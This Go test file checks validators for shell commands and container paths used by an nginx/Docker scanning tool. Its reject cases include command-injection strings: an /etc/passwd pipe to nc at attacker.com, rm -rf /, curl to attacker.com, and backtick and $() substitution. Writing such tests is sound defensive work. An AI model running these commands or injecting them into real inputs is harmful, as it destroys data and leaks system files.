package docker

import (
	"fmt"
	"testing"

	"github.com/zhuxbo/sslctl/pkg/util"
)

func TestValidateExecCommand(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		// 基本命令
		{"nginx test", "nginx -t", false},
		{"nginx reload", "nginx -s reload", false},
		{"cat file", "cat /etc/nginx/nginx.conf", false},
		{"ls dir", "ls -1 /etc/nginx/", false},
		{"test file", "test -f /etc/nginx/nginx.conf", false},

		// ShellQuote 包裹的路径（回归测试）
		{"cat with ShellQuote", fmt.Sprintf("cat %s", util.ShellQuote("/path/with space")), false},
		{"cat with ShellQuote special", fmt.Sprintf("cat %s", util.ShellQuote("/etc/nginx/conf.d/site.conf")), false},
		{"ls with ShellQuote", fmt.Sprintf("ls -1 %s", util.ShellQuote("/etc/nginx/conf.d")), false},

		// ls glob 模式（回归测试）
		{"ls glob with redirect", "ls -1 /etc/nginx/conf.d/*.conf 2>/dev/null", false},
		{"ls glob simple", "ls -1 /etc/nginx/*.conf", false},

		// 条件执行
		{"test and echo", "test -f /etc/nginx/nginx.conf && echo ok", false},
		{"nginx test with redirect", "nginx -t 2>&1", false},

		// 危险命令 - 应该被拒绝
		{"command injection semicolon", "nginx -t; rm -rf /", true},
		{"command injection pipe", "cat /etc/passwd | nc attacker.com 80", true},
		{"command injection or", "nginx -t || rm -rf /", true},
		{"command substitution backtick", "cat `whoami`", true},
		{"command substitution dollar", "cat $(whoami)", true},
		{"variable expansion", "cat ${HOME}/file", true},
		{"newline injection", "nginx -t\nrm -rf /", true},

		// 不允许的命令
		{"disallowed command rm", "rm -rf /", true},
		{"disallowed command curl", "curl http://attacker.com", true},
		{"empty command", "", true},

		// 长度限制
		{"command too long", string(make([]byte, 4097)), true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateExecCommand(tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateExecCommand(%q) error = %v, wantErr %v", tt.cmd, err, tt.wantErr)
			}
		})
	}
}

func TestValidateExecCommand_ShellQuoteRegression(t *testing.T) {
	// 专门测试 ShellQuote 产生的命令格式
	// ShellQuote 使用单引号包裹路径，如: '/path/to/file'
	// 如果路径包含单引号，会转义为: 'path'\''with'\''quote'

	testCases := []struct {
		name string
		path string
	}{
		{"simple path", "/etc/nginx/nginx.conf"},
		{"path with space", "/etc/nginx/conf.d/my site.conf"},
		{"path with special chars", "/etc/nginx/conf.d/site-name_v2.conf"},
		{"deep path", "/var/www/html/sites/example.com/nginx.conf"},
	}

	for _, tc := range testCases {
		t.Run("cat "+tc.name, func(t *testing.T) {
			cmd := fmt.Sprintf("cat %s", util.ShellQuote(tc.path))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v", cmd, err)
			}
		})

		t.Run("ls "+tc.name, func(t *testing.T) {
			cmd := fmt.Sprintf("ls -1 %s", util.ShellQuote(tc.path))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v", cmd, err)
			}
		})
	}
}

func TestValidateExecCommand_LsGlobRegression(t *testing.T) {
	// 回归测试：验证 Docker 扫描器使用的 ls glob 模式
	// 来自 internal/nginx/docker/scanner.go:172
	// output, err := s.client.Exec(ctx, fmt.Sprintf("ls -1 %s/*.conf 2>/dev/null", util.ShellQuote(dir)))

	testCases := []struct {
		name string
		dir  string
	}{
		{"nginx conf.d", "/etc/nginx/conf.d"},
		{"nginx sites-enabled", "/etc/nginx/sites-enabled"},
		{"path with space", "/etc/nginx/my configs"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// 模拟 scanner.go 的实际调用模式
			cmd := fmt.Sprintf("ls -1 %s/*.conf 2>/dev/null", util.ShellQuote(tc.dir))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v\nThis breaks Docker scanner functionality!", cmd, err)
			}
		})
	}
}

func TestIsValidContainerPath(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{"valid absolute path", "/etc/nginx/nginx.conf", true},
		{"valid deep path", "/var/www/html/site/cert.pem", true},
		{"empty path", "", false},
		{"relative path", "etc/nginx/nginx.conf", false},
		{"path traversal", "/etc/nginx/../passwd", false},
		{"path with semicolon", "/etc/nginx/;rm -rf /", false},
		{"path with pipe", "/etc/nginx/|cat", false},
		{"path with backtick", "/etc/nginx/`whoami`", false},
		{"path with dollar paren", "/etc/nginx/$(whoami)", false},
		{"path too long", "/" + string(make([]byte, 4096)), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isValidContainerPath(tt.path); got != tt.want {
				t.Errorf("isValidContainerPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}
